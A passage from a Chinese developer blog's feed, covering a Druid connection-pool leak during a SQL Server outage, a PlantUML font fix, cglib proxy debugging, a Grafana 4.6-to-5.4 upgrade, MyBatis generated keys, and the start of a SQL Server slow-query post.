org.springframework.jdbc.datasource.DataSourceUtils.doGetConnection(DataSourceUtils.java:115)</span><br><span class="line">at org.springframework.jdbc.datasource.DataSourceUtils.getConnection(DataSourceUtils.java:78)</span><br><span class="line">... 131 common frames omitted</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2020-04-09 17:32:43.701 ERROR [pms-provider-prod,,,] --- [reate-219971169] com.alibaba.druid.pool.DruidDataSource   : create connection SQLException, url: jdbc:sqlserver://xxx:3433;DatabaseName=xx, errorCode 0, state 08S01</span><br><span class="line"></span><br><span class="line">com.microsoft.sqlserver.jdbc.SQLServerException: 通过端口 1433 连接到主机 R8IC10364 的 TCP/IP 连接失败。错误:“null。请验证连接属性。确保 SQL Server 的实例正在主机上运行，且在此端口接受 TCP/IP 连接，还要确保防火墙没有阻止到此端口的 TCP 连接。”。</span><br><span class="line">at com.microsoft.sqlserver.jdbc.SQLServerException.makeFromDriverError(SQLServerException.java:190)</span><br><span class="line">at com.microsoft.sqlserver.jdbc.SQLServerException.ConvertConnectExceptionToSQLServerException(SQLServerException.java:241)</span><br><span class="line">at com.microsoft.sqlserver.jdbc.SocketFinder.findSocket(IOBuffer.java:2243)</span><br><span class="line">at com.microsoft.sqlserver.jdbc.TDSChannel.open(IOBuffer.java:491)</span><br><span class="line">at com.microsoft.sqlserver.jdbc.SQLServerConnection.connectHelper(SQLServerConnection.java:1309)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2020-04-09 17:33:09.338 ERROR [pms-provider-prod,69497e80a3d973de,69497e80a3d973de,<span class="literal">false</span>] --- [io-11022-exec-9] c.a.m.h.m.i.MyBatisMigrateChainIdKiller  : migrate.helper.MyBatisMigrateChainIdKillerError处理过程出现错误,</span><br><span class="line"></span><br><span class="line">org.springframework.jdbc.CannotGetJdbcConnectionException: Failed to obtain JDBC Connection; nested exception is com.microsoft.sqlserver.jdbc.SQLServerException: Database <span class="string">'xxx'</span> cannot be opened. It is <span class="keyword">in</span> the middle of a restore.</span><br><span class="line">at org.springframework.jdbc.datasource.DataSourceUtils.getConnection(DataSourceUtils.java:81)</span><br><span class="line">at org.mybatis.spring.transaction.SpringManagedTransaction.openConnection(SpringManagedTransaction.java:82)</span><br><span class="line">...</span><br><span class="line">Caused by: com.microsoft.sqlserver.jdbc.SQLServerException: Database <span class="string">'xxxx'</span> cannot be opened. It is <span class="keyword">in</span> the middle of a restore.</span><br><span class="line">at com.microsoft.sqlserver.jdbc.SQLServerException.makeFromDatabaseError(SQLServerException.java:216)</span><br><span class="line">at com.microsoft.sqlserver.jdbc.TDSTokenHandler.onEOF(tdsparser.java:254)</span><br><span class="line">at com.microsoft.sqlserver.jdbc.TDSParser.parse(tdsparser.java:84)</span><br><span class="line">at com.microsoft.sqlserver.jdbc.TDSParser.parse(tdsparser.java:39)</span><br><span class="line">at com.microsoft.sqlserver.jdbc.SQLServerConnection<span class="variable">$1ConnectionCommand</span>.doExecute(SQLServerConnection.java:1756)</span><br><span class="line">at com.microsoft.sqlserver.jdbc.TDSCommand.execute(IOBuffer.java:5696)</span><br><span class="line">at com.microsoft.sqlserver.jdbc.SQLServerConnection.executeCommand(SQLServerConnection.java:1715)</span><br><span class="line">at com.microsoft.sqlserver.jdbc.SQLServerConnection.connectionCommand(SQLServerConnection.java:1761)</span><br><span class="line">at com.microsoft.sqlserver.jdbc.SQLServerConnection.setCatalog(SQLServerConnection.java:2063)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:750)</span><br><span class="line">at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">at com.alibaba.druid.proxy.jdbc.ConnectionProxyImpl.setCatalog(ConnectionProxyImpl.java:437)</span><br><span class="line">at com.alibaba.druid.pool.DruidPooledConnection.setCatalog(DruidPooledConnection.java:910)</span><br><span class="line">at com.atour.db.DynamicDataSource.getConnection(DynamicDataSource.java:143)</span><br><span class="line">at org.springframework.jdbc.datasource.DataSourceUtils.fetchConnection(DataSourceUtils.java:151)</span><br><span class="line">at org.springframework.jdbc.datasource.DataSourceUtils.doGetConnection(DataSourceUtils.java:115)</span><br><span class="line">at org.springframework.jdbc.datasource.DataSourceUtils.getConnection(DataSourceUtils.java:78)</span><br><span class="line">  ... 131 common frames omitted</span><br></pre></td></tr></table></figure><p>异常栈中关键的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Connection <span class="title">getConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">Connection connection = <span class="keyword">this</span>.determineTargetDataSource().getConnection();</span><br><span class="line"><span class="keyword">if</span>(dynamicInstance) &#123;</span><br><span class="line"><span class="comment">/**数据源创建到实例维度，获取连接之前设置数据库名*/</span></span><br><span class="line">    <span class="comment">// 这里setCatalog抛出了异常</span></span><br><span class="line">connection.setCatalog(databaseNameMap.get(DynamicDataSourceHolder.getDataSouce()));</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">return</span> connection;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先druid的配置没有设置<code>testOnBorrow</code>，拿到连接之后没有校验连接的有效性；</p><p>其次，由于分库太多（实例没有那么多），公司开发了中间件，动态切换数据库（就是上面的代码，一个druid实例默认就有一个Create线程和Destroy线程，有上百分库的时候，开销就相当大）。</p><p><strong>连接池的变化</strong></p><p>数据库刚开始断开的时候，业务线程拿到连接之后，执行<code>setCatalog</code>操作，此时会失败，然后没有catch关闭对应的数据库连接，就会占用druid的一个active count；</p><p>中间有创建连接Druid-ConnectionPool-C<code>reate-219971169</code>， 尝试创建，然后失败了。</p><p>后续数据库应该可以连上了，但是切换分库会有问题，也会占用druid的一个active count；</p><p>最终active count 会被占满，然后就无法创建连接，业务线程和连接创建线程都会一直等待。</p><h2 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h2><ul><li><p>必须设置获取连接的等待时间（maxWait) 和最大等待线程个数（maxWaitThreadCount）。</p></li><li><p>操作连接的时候，一定要在异常的情况下关闭连接，不要造成连接的泄露</p></li><li>可以设置druid的<ul><li><code>removeAbandoned</code> （是否强制关闭连接时长大于removeAbandonedTimeoutMillis的连接）</li><li><code>removeAbandonedTimeoutMillis</code> （一个连接从被连接到被关闭之间的最大生命周期）</li><li><code>logAbandoned</code> （强制关闭连接时是否记录日志）</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;现象&quot;&gt;&lt;a href=&quot;#现象&quot; class=&quot;headerlink&quot; title=&quot;现象&quot;&gt;&lt;/a&gt;现象&lt;/h2&gt;&lt;p&gt;当时数据库需要升级配置，已知中间会有闪断，按照之前的经验都是自动重连然后恢复。但是，这次tomcat的连接线程全部变成busy，导致应用不能
      
    
    </summary>
    
      <category term="druid" scheme="http://qsli.github.io/categories/druid/"/>
    
    
      <category term="druid" scheme="http://qsli.github.io/tags/druid/"/>
    
  </entry>
  
  <entry>
    <title>mediawiki-plantuml</title>
    <link href="http://qsli.github.io/2020/03/23/mediawiki-plantuml/"/>
    <id>http://qsli.github.io/2020/03/23/mediawiki-plantuml/</id>
    <published>2020-03-22T18:12:14.000Z</published>
    <updated>2020-03-22T18:12:14.564Z</updated>
    
    <content type="html"><![CDATA[<p>mediawiki的plantuml插件，在渲染中文的时候，发现文字丢了。</p><img src="/2020/03/23/mediawiki-plantuml/WeChatWorkScreenshot_0e466b8c-c8f5-48c4-bcab-45db7ddbf597.png"><p>方框里中文的说明都没有了，最后发现是缺少字体，这里mark下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install cjkuni-uming-fonts</span><br></pre></td></tr></table></figure><p>安装完字体就好了:</p><img src="/2020/03/23/mediawiki-plantuml/uml-13d5bec9d5aa4740c2198be487d50707-b9db094fe17005d80a48cfc93309f835.png">]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;mediawiki的plantuml插件，在渲染中文的时候，发现文字丢了。&lt;/p&gt;
&lt;img src=&quot;/2020/03/23/mediawiki-plantuml/WeChatWorkScreenshot_0e466b8c-c8f5-48c4-bcab-45db7ddbf
      
    
    </summary>
    
      <category term="mediawiki" scheme="http://qsli.github.io/categories/mediawiki/"/>
    
    
      <category term="plantuml" scheme="http://qsli.github.io/tags/plantuml/"/>
    
  </entry>
  
  <entry>
    <title>cglib-tips</title>
    <link href="http://qsli.github.io/2020/03/23/cglib-tips/"/>
    <id>http://qsli.github.io/2020/03/23/cglib-tips/</id>
    <published>2020-03-22T17:56:51.000Z</published>
    <updated>2020-03-22T17:56:51.374Z</updated>
    
    <content type="html"><![CDATA[<ul><li>设置debug的环境变量</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 该设置用于输出cglib动态代理产生的类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">System.setProperty(DebuggingClassWriter.DEBUG_LOCATION_PROPERTY, <span class="string">"/tmp/"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 该设置用于输出jdk动态代理产生的类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">System.getProperties().put(<span class="string">"sun.misc.ProxyGenerator.saveGeneratedFiles"</span>, <span class="string">"true"</span>);</span><br></pre></td></tr></table></figure><img src="/2020/03/23/cglib-tips/image-20200322181246078.png"><ul><li>或者使用 HSDB（Hotspot的debug工具）</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo java -classpath <span class="string">"/Library/Java/JavaVirtualMachines/jdk1.8.0_181.jdk/Contents/Home/lib/sa-jdi.jar"</span>  sun.jvm.hotspot.HSDB</span><br></pre></td></tr></table></figure><p>attach到指定的进程之后，选择class browser，就可以找到动态生成的类</p><img src="/2020/03/23/cglib-tips/image-20200322181636481.png"><p>点进去</p><img src="/2020/03/23/cglib-tips/image-20200322181729901.png"><p>会在当前目录生成对应的class文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  /tmp  tree</span><br><span class="line">.</span><br><span class="line">├── com</span><br><span class="line">│   └── air</span><br><span class="line">│       └── mvc</span><br><span class="line">│           └── SampleController$<span class="variable">$EnhancerBySpringCGLIB</span>$<span class="variable">$d680c039</span>.class</span><br></pre></td></tr></table></figure><p>对应的class文件就创建了，可以拖到idea或者其他的工具中查看，也可以查看类的继承关系</p><img src="/2020/03/23/cglib-tips/image-20200322181908616.png">]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;设置debug的环境变量&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span clas
      
    
    </summary>
    
      <category term="spring" scheme="http://qsli.github.io/categories/spring/"/>
    
    
      <category term="cglib" scheme="http://qsli.github.io/tags/cglib/"/>
    
  </entry>
  
  <entry>
    <title>升级grafana</title>
    <link href="http://qsli.github.io/2019/01/10/grafana-upgrade/"/>
    <id>http://qsli.github.io/2019/01/10/grafana-upgrade/</id>
    <published>2019-01-10T15:53:08.000Z</published>
    <updated>2019-01-10T15:53:08.311Z</updated>
    
    <content type="html"><![CDATA[<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>目前的grafana版本过低，只有在状态变化的时候才发送报警的提醒</p><blockquote><p>Grafana sends notifications on state changes, so OK -&gt; Alerting, Alerting -&gt; OK, OK -&gt; NoData, etc</p></blockquote><p>高版本有work around可以解决：</p><blockquote><p>This is possible since 5.3 if you configure alert reminder at the same or lower interval as the alert rule.</p><p>It’s not exactly what’s described in this issue but its close enough that we won’t implement this feature.</p></blockquote><h2 id="当前配置信息"><a href="#当前配置信息" class="headerlink" title="当前配置信息"></a>当前配置信息</h2><p>当前版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd-devops-web yum.repos.d]$ sudo yum list installed | grep grafana</span><br><span class="line">grafana.x86_64                        4.6.3-1                        installed</span><br></pre></td></tr></table></figure><p>启动脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd-devops-web yum.repos.d]$ ps axu | grep grafana</span><br><span class="line">qisheng+ 24599  0.0  0.0 112660   976 pts/1    S+   14:10   0:00 grep --color=auto grafana</span><br><span class="line">grafana  28995  0.9  0.2 2414524 46008 ?       Ssl  Jan08  28:22 /usr/sbin/grafana-server --config=/etc/grafana/grafana.ini --pidfile=/var/run/grafana/grafana-server.pid cfg:default.paths.logs=/var/<span class="built_in">log</span>/grafana cfg:default.paths.data=/var/lib/grafana cfg:default.paths.plugins=/var/lib/grafana/plugins</span><br></pre></td></tr></table></figure><p>LDAP配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#################################### Auth LDAP ##########################</span></span><br><span class="line">[auth.ldap]</span><br><span class="line">enabled = <span class="literal">true</span></span><br><span class="line">config_file = /etc/grafana/ldap.toml</span><br><span class="line">allow_sign_up = <span class="literal">true</span></span><br></pre></td></tr></table></figure><h2 id="风险评估"><a href="#风险评估" class="headerlink" title="风险评估"></a>风险评估</h2><p>grafana只是作为展示层，升级对程序打点和数据收集无影响，而且grafana是后向兼容的；升级只会影响监控的查看和报警。</p><blockquote><p>We recommend everyone to upgrade Grafana often to stay up to date with the latest fixes and enhancements. In order make this a reality Grafana upgrades are backward compatible and the upgrade process is simple &amp; quick.</p></blockquote><h2 id="升级步骤"><a href="#升级步骤" class="headerlink" title="升级步骤"></a>升级步骤</h2><h3 id="备份配置文件"><a href="#备份配置文件" class="headerlink" title="备份配置文件"></a>备份配置文件</h3><ul><li>/etc/grafana/grafana.ini </li><li>/etc/grafana/ldap.toml</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd-devops-web yum.repos.d]$ sudo cp -p /etc/grafana/ldap.toml ~/</span><br><span class="line">[qisheng.li@yd-devops-web yum.repos.d]<span class="variable">$sudo</span> cp -p  /etc/grafana/grafana.ini  ~/</span><br></pre></td></tr></table></figure><h3 id="备份db"><a href="#备份db" class="headerlink" title="备份db"></a>备份db</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd-devops-web yum.repos.d]$ sudo cp -p /var/lib/grafana/grafana.db ~/</span><br></pre></td></tr></table></figure><h3 id="更新yum源"><a href="#更新yum源" class="headerlink" title="更新yum源"></a>更新yum源</h3><p>aliyun的yum的最新版本是<code>4.6.3</code>是我们当前使用的版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd-devops-web yum.repos.d]$ yum info grafana</span><br><span class="line">Loaded plugins: fastestmirror</span><br><span class="line">Loading mirror speeds from cached hostfile</span><br><span class="line"> * base: mirrors.aliyun.com</span><br><span class="line"> * extras: mirrors.aliyun.com</span><br><span class="line"> * updates: mirrors.aliyun.com</span><br><span class="line">Installed Packages</span><br><span class="line">Name        : grafana</span><br><span class="line">Arch        : x86_64</span><br><span class="line">Version     : 4.6.3</span><br><span class="line">Release     : 1</span><br><span class="line">Size        : 133 M</span><br><span class="line">Repo        : installed</span><br><span class="line">Summary     : Grafana</span><br><span class="line">URL         : https://grafana.com</span><br><span class="line">License     : <span class="string">"Apache 2.0"</span></span><br><span class="line">Description : Grafana</span><br></pre></td></tr></table></figure><p>添加grafana的源<a href="http://docs.grafana.org/installation/rpm/" rel="external nofollow noopener noreferrer" target="_blank">Installing on RPM-based Linux | Grafana Documentation</a></p><p>新建配置文件<code>/etc/yum.repos.d/grafana.repo</code></p><p>键入一下内容：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[grafana]</span></span><br><span class="line"><span class="attr">name</span>=grafana</span><br><span class="line"><span class="attr">baseurl</span>=https://packages.grafana.com/oss/rpm</span><br><span class="line"><span class="attr">repo_gpgcheck</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">enabled</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">gpgcheck</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">gpgkey</span>=https://packages.grafana.com/gpg.key</span><br><span class="line"><span class="attr">sslverify</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">sslcacert</span>=/etc/pki/tls/certs/ca-bundle.crt</span><br></pre></td></tr></table></figure><p>grafana也提供了beta的源，生产环境不建议使用。</p><p>再次查看yum信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd-devops-web yum.repos.d]$ yum info grafana</span><br><span class="line">Loaded plugins: fastestmirror</span><br><span class="line">Loading mirror speeds from cached hostfile</span><br><span class="line"> * base: mirrors.aliyun.com</span><br><span class="line"> * extras: mirrors.aliyun.com</span><br><span class="line"> * updates: mirrors.aliyun.com</span><br><span class="line">Installed Packages</span><br><span class="line">Name        : grafana</span><br><span class="line">Arch        : x86_64</span><br><span class="line">Version     : 4.6.3</span><br><span class="line">Release     : 1</span><br><span class="line">Size        : 133 M</span><br><span class="line">Repo        : installed</span><br><span class="line">Summary     : Grafana</span><br><span class="line">URL         : https://grafana.com</span><br><span class="line">License     : <span class="string">"Apache 2.0"</span></span><br><span class="line">Description : Grafana</span><br><span class="line"></span><br><span class="line">Available Packages</span><br><span class="line">Name        : grafana</span><br><span class="line">Arch        : x86_64</span><br><span class="line">Version     : 5.4.2</span><br><span class="line">Release     : 1</span><br><span class="line">Size        : 52 M</span><br><span class="line">Repo        : grafana</span><br><span class="line">Summary     : Grafana</span><br><span class="line">URL         : https://grafana.com</span><br><span class="line">License     : <span class="string">"Apache 2.0"</span></span><br><span class="line">Description : Grafana</span><br></pre></td></tr></table></figure><p>可以拿到<code>5.4.2</code>的信息了</p><h3 id="升级版本"><a href="#升级版本" class="headerlink" title="升级版本"></a>升级版本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd-devops-web yum.repos.d]$ sudo yum update grafana</span><br></pre></td></tr></table></figure><h2 id="配置reminder"><a href="#配置reminder" class="headerlink" title="配置reminder"></a>配置reminder</h2><p><img src="image-20190110234737778.png" alt="image-20190110234737778"></p><p>这样如果处于alert状态就会每隔30s报一次</p><p><img src="image-20190110234843905.png" alt="image-20190110234843905"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://github.com/grafana/grafana/issues/12356" rel="external nofollow noopener noreferrer" target="_blank">Send alert notification for every alert eval regardless of state · Issue #12356 · grafana/grafana</a></li><li><a href="http://docs.grafana.org/installation/upgrading/" rel="external nofollow noopener noreferrer" target="_blank">Upgrading | Grafana Documentation</a></li><li><a href="https://github.com/grafana/grafana/issues/7277" rel="external nofollow noopener noreferrer" target="_blank">[Question] Alert notify only once ? · Issue #7277 · grafana/grafana</a></li><li><a href="http://docs.grafana.org/installation/rpm/" rel="external nofollow noopener noreferrer" target="_blank">Installing on RPM-based Linux | Grafana Documentation</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;缘起&quot;&gt;&lt;a href=&quot;#缘起&quot; class=&quot;headerlink&quot; title=&quot;缘起&quot;&gt;&lt;/a&gt;缘起&lt;/h2&gt;&lt;p&gt;目前的grafana版本过低，只有在状态变化的时候才发送报警的提醒&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Grafana sends no
      
    
    </summary>
    
      <category term="linux" scheme="http://qsli.github.io/categories/linux/"/>
    
    
      <category term="grafana" scheme="http://qsli.github.io/tags/grafana/"/>
    
  </entry>
  
  <entry>
    <title>mybatis-get-generated-id</title>
    <link href="http://qsli.github.io/2019/01/06/mybatis-get-generated-id/"/>
    <id>http://qsli.github.io/2019/01/06/mybatis-get-generated-id/</id>
    <published>2019-01-06T09:41:12.000Z</published>
    <updated>2019-01-06T09:41:12.086Z</updated>
    
    <content type="html"><![CDATA[<h2 id="mybatis获取自增主键"><a href="#mybatis获取自增主键" class="headerlink" title="mybatis获取自增主键"></a>mybatis获取自增主键</h2><h3 id="使用useGeneratedKeys"><a href="#使用useGeneratedKeys" class="headerlink" title="使用useGeneratedKeys"></a>使用useGeneratedKeys</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">"add"</span> <span class="attr">parameterType</span>=<span class="string">"Staff"</span> <span class="attr">useGeneratedKeys</span>=<span class="string">"true"</span> <span class="attr">keyProperty</span>=<span class="string">"id"</span>&gt;</span></span><br><span class="line">  insert into Staff(name, age) values(#&#123;name&#125;, #&#123;age&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>useGeneratedKeys</code>既可以用于单条插入语句中获取自增主键，也可以用于多条语句中获取自增主键。</p><h3 id="使用-IDENTITY"><a href="#使用-IDENTITY" class="headerlink" title="使用@@IDENTITY"></a>使用@@IDENTITY</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">"add"</span> <span class="attr">parameterType</span>=<span class="string">"Staff"</span> <span class="attr">keyProperty</span>=<span class="string">"id"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">selectKey</span> <span class="attr">keyProperty</span>=<span class="string">"id"</span> <span class="attr">order</span>=<span class="string">"AFTER"</span> <span class="attr">resultType</span>=<span class="string">"java.lang.Integer"</span>&gt;</span></span><br><span class="line">select @@IDENTITY</span><br><span class="line">    <span class="tag">&lt;/<span class="name">selectKey</span>&gt;</span></span><br><span class="line">    insert into Staff(name, age) values(#&#123;name&#125;, #&#123;age&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br></pre></td></tr></table></figure><p>只支持一条插入时获取自增主键，而且跟数据库的支持有关.</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="https://www.cnblogs.com/fsjohnhuang/p/4078659.html" rel="external nofollow noopener noreferrer" target="_blank">MyBatis魔法堂：Insert操作详解（返回主键、批量插入） - ^_^肥仔John - 博客园</a></li><li><a href="https://buptubuntu.github.io/2017/07/16/Mybatis-Auto-Generate-Key/" rel="external nofollow noopener noreferrer" target="_blank">Mybatis Auto Generate Key | buptubuntu的博客</a></li><li><a href="http://www.mybatis.org/generator/configreference/generatedKey.html" rel="external nofollow noopener noreferrer" target="_blank">MyBatis Generator Core – The <generatedkey> Element</generatedkey></a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;mybatis获取自增主键&quot;&gt;&lt;a href=&quot;#mybatis获取自增主键&quot; class=&quot;headerlink&quot; title=&quot;mybatis获取自增主键&quot;&gt;&lt;/a&gt;mybatis获取自增主键&lt;/h2&gt;&lt;h3 id=&quot;使用useGeneratedKeys&quot;&gt;&lt;
      
    
    </summary>
    
      <category term="mybatis" scheme="http://qsli.github.io/categories/mybatis/"/>
    
    
      <category term="自增主键" scheme="http://qsli.github.io/tags/%E8%87%AA%E5%A2%9E%E4%B8%BB%E9%94%AE/"/>
    
  </entry>
  
  <entry>
    <title>sqlserver杀掉慢查询</title>
    <link href="http://qsli.github.io/2018/10/09/sqlserver-slow-killer/"/>
    <id>http://qsli.github.io/2018/10/09/sqlserver-slow-killer/</id>
    <published>2018-10-09T01:26:38.000Z</published>
    <updated>2018-10-09T01:26:38.776Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><p>查询慢查询的信息：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span></span><br><span class="line">    <span class="keyword">SUBSTRING</span>(qt.TEXT, (er.statement_start_offset/<span class="number">2</span>)+<span class="number">1</span>, ((<span class="keyword">CASE</span> er.statement_end_offset <span class="keyword">WHEN</span> <span class="number">-1</span> <span class="keyword">THEN</span> <span class="keyword">DATALENGTH</span>(qt.TEXT) <span class="keyword">ELSE</span> er.statement_end_offset <span class="keyword">END</span> - er.statement_start_offset)/<span class="number">2</span>)+<span class="number">1</span>) <span class="keyword">AS</span> query_sql,</span><br><span class="line">    er.session_id <span class="keyword">AS</span> pid,</span><br><span class="line">    er.status <span class="keyword">AS</span> <span class="keyword">status</span>,</span><br><span class="line">    er.command <span class="keyword">AS</span> command,</span><br><span class="line">    sp.hostname <span class="keyword">AS</span> hostname,</span><br><span class="line">    DB_NAME(sp.dbid) <span class="keyword">AS</span> db_name,</span><br><span class="line">    sp.program_name <span class="keyword">AS</span> program_name,</span><br><span class="line">    er.cpu_time <span class="keyword">AS</span> cpu_time,</span><br><span class="line">    er.total_elapsed_time <span class="keyword">AS</span> cost_time</span><br><span class="line"><span class="keyword">FROM</span> sys.sysprocesses <span class="keyword">AS</span> sp <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> sys.dm_exec_requests <span class="keyword">AS</span> er <span class="keyword">ON</span> sp.spid = er.session_id</span><br><span class="line"><span class="keyword">CROSS</span> <span class="keyword">APPLY</span> 